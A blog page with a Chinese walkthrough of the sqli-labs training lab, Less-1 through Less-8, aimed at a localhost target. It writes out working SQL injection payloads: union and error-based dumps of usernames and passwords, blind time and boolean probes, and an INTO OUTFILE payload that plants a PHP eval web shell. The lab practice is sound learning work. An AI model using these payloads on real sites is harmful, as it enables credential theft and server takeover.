<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>sqli/sqli-labs | Michelle's Blog</title><meta name="description" content="sqli/sqli-labs"><meta name="author" content="Michelle19l"><meta name="copyright" content="Michelle19l"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/smile.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="sqli/sqli-labs"><meta name="twitter:description" content="sqli/sqli-labs"><meta name="twitter:image" content="https://gitee.com/michelle19l/michelle19l/img/timg.jpg"><meta property="og:type" content="article"><meta property="og:title" content="sqli/sqli-labs"><meta property="og:url" content="https://gitee.com/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/"><meta property="og:site_name" content="Michelle's Blog"><meta property="og:description" content="sqli/sqli-labs"><meta property="og:image" content="https://gitee.com/michelle19l/michelle19l/img/timg.jpg"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://gitee.com/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/"><link rel="prev" title="sagemath使用教程" href="https://gitee.com/michelle19l/michelle19l/2020/09/21/sagemath%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"><link rel="next" title="python/零散笔记" href="https://gitee.com/michelle19l/michelle19l/2020/08/07/python/%E9%9B%B6%E6%95%A3%E7%AC%94%E8%AE%B0/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  bookmark: {
    message_prev: 'Press',
    message_next: 'to bookmark this page'
  },
  runtime_unit: 'days',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: true,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: true,
  highlightCopy: true,
  highlightLang: true,
  highlightShrink: 'false',
  isFontAwesomeV5: false,
  isPhotoFigcaption: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">90</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">70</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">24</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/guide/"><i class="fa-fw fa fa-connectdevelop"></i><span> Guide</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li><li><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i><span> Book</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Page-1-Basic-Challenges"><span class="toc-number">1.</span> <span class="toc-text">Page-1 Basic Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-1-GET-Error-Based-Single-quotes-String-基于错误的GET单引号字符型注入"><span class="toc-number">1.1.</span> <span class="toc-text">Less-1 GET - Error Based -Single quotes - String 基于错误的GET单引号字符型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#初步判断"><span class="toc-number">1.1.1.</span> <span class="toc-text">初步判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实施攻击"><span class="toc-number">1.1.2.</span> <span class="toc-text">实施攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-2-Error-Based-Intiger-基于错误的GET整型注入"><span class="toc-number">1.2.</span> <span class="toc-text">Less-2 Error Based - Intiger 基于错误的GET整型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-3-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><span class="toc-number">1.3.</span> <span class="toc-text">Less-3 - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><span class="toc-number">1.4.</span> <span class="toc-text">Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><span class="toc-number">1.5.</span> <span class="toc-text">Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入"><span class="toc-number">1.6.</span> <span class="toc-text">Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）"><span class="toc-number">1.7.</span> <span class="toc-text">Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注"><span class="toc-number">1.8.</span> <span class="toc-text">Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注"><span class="toc-number">1.9.</span> <span class="toc-text">Less-9 GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注"><span class="toc-number">1.10.</span> <span class="toc-text">Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入"><span class="toc-number">1.11.</span> <span class="toc-text">Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入"><span class="toc-number">1.12.</span> <span class="toc-text">Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><span class="toc-number">1.13.</span> <span class="toc-text">Less-14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入"><span class="toc-number">1.14.</span> <span class="toc-text">Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入"><span class="toc-number">1.15.</span> <span class="toc-text">Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入"><span class="toc-number">1.16.</span> <span class="toc-text">Less-20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入"><span class="toc-number">1.17.</span> <span class="toc-text">Less-21 Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入"><span class="toc-number">1.18.</span> <span class="toc-text">Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型"><span class="toc-number">1.19.</span> <span class="toc-text">Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入"><span class="toc-number">1.20.</span> <span class="toc-text">Less - 24 Second Degree Injections Real treat -Store Injections (二次注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用union查询"><span class="toc-number">1.20.1.</span> <span class="toc-text">使用union查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#双写or和and"><span class="toc-number">1.20.2.</span> <span class="toc-text">双写or和and</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-26-failed-Trick-with-comments-and-space-过滤了注释和空格的注入"><span class="toc-number">1.21.</span> <span class="toc-text">Less-26(failed) Trick with comments and space (过滤了注释和空格的注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml注入"><span class="toc-number">1.21.1.</span> <span class="toc-text">updatexml注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-（过滤了union和select的）"><span class="toc-number">1.22.</span> <span class="toc-text">less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us"><span class="toc-number">1.23.</span> <span class="toc-text">less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(/img/timg.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">Michelle's Blog</a></span><span class="pull_right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/guide/"><i class="fa-fw fa fa-connectdevelop"></i><span> Guide</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li><li><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i><span> Book</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">sqli/sqli-labs</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="Created 2020-08-29 12:42:18"><i class="fa fa-calendar" aria-hidden="true"></i> Created 2020-08-29</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="Updated 2020-08-29 12:42:18"><i class="fa fa-history" aria-hidden="true"></i> Updated 2020-08-29</span></time></div><div class="meta-secondline"> <span class="post-meta-wordcount"><i class="post-meta__icon fa fa-file-word-o" aria-hidden="true"></i><span>Word count:</span><span class="word-count">4.9k</span><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-clock-o" aria-hidden="true"></i><span>Reading time: 24 min</span></span></div><div class="meta-thirdline"><span class="post-meta-pv-cv"><span class="post-meta__separator">|</span><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>Post View:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div id="article-container"><blockquote>
<p>教程参考:</p>
<p><a href="https://blog.csdn.net/he_and/article/details/79979616" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/79979616</a></p>
<p>[<a href="https://blog.csdn.net/qq_41420747/article/details/81836327##Less-1%20GET%20-%20Error%20based%20-%20Single%20quotes%20-%20String(%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5)]" target="_blank" rel="noopener">https://blog.csdn.net/qq_41420747/article/details/81836327##Less-1%20GET%20-%20Error%20based%20-%20Single%20quotes%20-%20String(%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5)]</a>(<a href="https://blog.csdn.net/qq_41420747/article/details/81836327##Less-1" target="_blank" rel="noopener">https://blog.csdn.net/qq_41420747/article/details/81836327##Less-1</a> GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入))</p>
</blockquote>
<p>[TOC]</p>
<h1 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1 Basic Challenges"></a>Page-1 Basic Challenges</h1><h2 id="Less-1-GET-Error-Based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-Based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error Based -Single quotes - String 基于错误的GET单引号字符型注入"></a>Less-1 GET - Error Based -Single quotes - String 基于错误的GET单引号字符型注入</h2><h3 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h3><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807145525940.png"  alt="image-20200807145525940" style="zoom:33%;">

<p>要求输入id，在网址上加入?id=1</p>
<p>有反应<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807145629437.png"  alt="image-20200807145629437" style="zoom:33%;"></p>
<p>再<font color="green">加单引号，报错</font>，存在注入</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807145709029.png"  alt="image-20200807145709029"></p>
<h3 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h3><p><font color="green">单引号可以被解析，通过闭合id参数，插入自己构造的sql语句实施攻击</font></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' order by 1 <span class="comment">##</span></span><br></pre></td></tr></table></figure>

<p>报错，将<code>##</code>改为编码<code>%23</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' order by 1 %23</span><br></pre></td></tr></table></figure>

<p>成功显示，尝试，4的时候报错</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807150637111.png"  alt="image-20200807150637111"></p>
<p>说明db只有三个字段</p>
<p>当查询结果为多个时只返回第一个，所以使用union查询且使原结果为空</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>发现2，3被显示在了页面上<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807151552387.png"  alt="image-20200807151552387" style="zoom:53%;"></p>
<p><font color="green">获取当前数据库版本，数据库路径，当前用户，当前数据库</font></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">concat_ws</span>(<span class="string">'_'</span>,<span class="keyword">user</span>(),<span class="keyword">version</span>(),<span class="keyword">database</span>()),@@basedir %<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>拿到信息<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807151952682.png"  alt="image-20200807151952682" style="zoom:40%;"></p>
<p><font color="green">表名</font></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807152305560.png"  alt="image-20200807152305560" style="zoom:50%;">

<p><font color="green">payload</font></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=1%27%20and%20extractvalue(1,concat(0x7e,(<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">group_concat</span>(username,<span class="number">0x3a</span>,<span class="keyword">password</span>)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span><span class="keyword">users</span>)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<h2 id="Less-2-Error-Based-Intiger-基于错误的GET整型注入"><a href="#Less-2-Error-Based-Intiger-基于错误的GET整型注入" class="headerlink" title="Less-2 Error Based - Intiger 基于错误的GET整型注入"></a>Less-2 Error Based - Intiger 基于错误的GET整型注入</h2><p>同Less-1，单引号报错</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' order by 1</span><br></pre></td></tr></table></figure>

<p>报错，判断是数值型注入</p>
<p>去掉单引号，其余同Less-1</p>
<h2 id="Less-3-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>Less-3 - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h2><p>源码 <img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807164139529.png"  alt="image-20200807164139529"></p>
<p>输入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' %23</span><br></pre></td></tr></table></figure>

<p>回显失败</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1') %23</span><br></pre></td></tr></table></figure>

<p>成功回显</p>
<h2 id="Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1'</span><br></pre></td></tr></table></figure>

<p>成功回显无报错</p>
<p>将单引号改成双引号</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1"</span><br></pre></td></tr></table></figure>

<p>报错,显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>仔细观察，是双引号+括号<code>where id=(”1”)</code>\</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1") %23</span><br></pre></td></tr></table></figure>

<p>正常回显</p>
<h2 id="Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h2><p>使用一种的方法发现可以注入，但是页面不能返回我们想要的全部信息</p>
<p>可以采用类似<font color="green">时间盲注</font>的方法（因为页面还是能返回一点点东西）</p>
<p><font color="green">数据库名长度</font>(可以采用二分法)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' and if(length(database())=8,sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>有明显延迟，长度为8</p>
<p><font color="green">爆破库名</font></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1' and if(left(database(),1)='s',sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>left是提取最左边</p>
<h2 id="Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入"><a href="#Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入" class="headerlink" title="Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)"></a>Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1"</span><br></pre></td></tr></table></figure>
<p>返回错误信息<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807170839602.png"  alt="image-20200807170839602" style="zoom:50%;"></p>
<p>说明是双引号的注入</p>
<p>其余同五</p>
<h2 id="Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）"><a href="#Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）" class="headerlink" title="Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）"></a>Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）</h2><p>源码：<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807171706714.png"  alt="image-20200807171706714"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807171508514.png"  alt="image-20200807171508514"></p>
<p>使用<font color="green">文件导出</font></p>
<p>使用前面的Less查到的路径</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Less-2/?id=-1 union <span class="keyword">select</span> <span class="number">1</span>,@@basedir,@@datadir <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200807171823337.png"  alt="image-20200807171823337" style="zoom:50%;">

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">"&lt;?php @eval($_POST['sql']);?&gt;"</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'路径'</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php @eval($_POST['</span><span class="keyword">sql</span><span class="string">']);?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\1.php"</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>注意必须要使用\\</p>
<p>==我没有导出文件来==</p>
<p>导出来，导出来之后用菜刀或者蚁剑连接</p>
<h2 id="Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注"><a href="#Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注" class="headerlink" title="Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)"></a>Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id='</span><br></pre></td></tr></table></figure>
<p>不回显</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1'</span><br></pre></td></tr></table></figure>

<p>不回显</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1' and 1=1 %23</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1' and 1=2 %23</span><br></pre></td></tr></table></figure>
<p>不回显</p>
<p>是布尔型注入</p>
<p>爆破方法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1' and left(database(),1)='s'%23</span><br></pre></td></tr></table></figure>



